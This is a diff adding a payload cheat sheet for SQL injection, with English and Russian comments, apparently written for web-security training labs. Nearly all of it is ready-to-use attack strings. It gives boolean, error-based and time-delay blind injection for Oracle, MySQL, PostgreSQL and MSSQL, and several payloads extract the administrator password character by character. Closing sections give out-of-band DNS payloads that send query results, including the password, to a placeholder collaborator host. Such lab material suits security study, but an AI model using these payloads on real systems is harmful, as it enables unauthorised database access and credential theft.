@@ -1,0 +1,101 @@
+###find blind sql_injection
+' AND '1'='1
+' AND '1'='2
+
+###error-based-sql-injection for find
+
+#oracle
+
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+### чтобы проверить, что usersтаблица существует
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+
+###существует ли имя пользователя administrator:
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+###определить, сколько символов в пароле administratorпользователь
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+###### find pass with subst
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+
+
+########mysql, postgresql, mssql
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+
+
+###find length pass 
+' AND LENGTH((SELECT password FROM users WHERE username='administrator'))=10--
+" AND LENGTH((SELECT password FROM users WHERE username='administrator'))=10--
+
+
+
+### find pass with ASCII code
+' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))=97--
+" AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))=97--
+### find pass with substr
+' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='$X$'--
+" AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='$X$'--
+' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+
+
+###Visible error-based SQL injection
+
+' AND CAST((SELECT 1) AS int)--
+' AND 1=CAST((SELECT 1) AS int)--
+' AND 1=CAST((SELECT username FROM users) AS int)--
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+
+###Lab: Blind SQL injection with time delays
+##for Microsoft SQL:
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+
+##for postgresql
+'||pg_sleep(10)-- 
+ SELECT pg_sleep(10) 
+'|| (SELECT pg_sleep(10))--
+#Существует ли таблица users:
+'||(SELECT CASE WHEN (EXISTS (SELECT 1 FROM users)) THEN pg_sleep(10) ELSE NULL END)--
+'||SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0)+END--
+#Есть ли пользователь 'administrator':
+'||(SELECT CASE WHEN (EXISTS (SELECT 1 FROM users WHERE username = 'administrator')) THEN pg_sleep(10) ELSE NULL END)--
+'||(SELECT CASE WHEN (EXISTS (SELECT 1 FROM users WHERE username = 'Administrator')) THEN pg_sleep(10) ELSE NULL END)--
+#Узнать длину пароля:
+'||(SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username = 'administrator') = 20) THEN pg_sleep(10) ELSE NULL END)--
+'||(SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username = 'administrator') > 10) THEN pg_sleep(10) ELSE NULL END)--
+'||(SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'm') THEN pg_sleep(10) ELSE NULL END FROM users WHERE username = 'administrator')--
+
+
+#####DNS-поиск 
+#ORACLE
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
+#MICROCSOFT
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 
+#PostgreSQL
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' 
+#MySQL
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' 
+
+#####DNS lookup with data exfiltration
+#oracle
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual 
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+#MySQL
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' 
+#Microsoft
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"') 
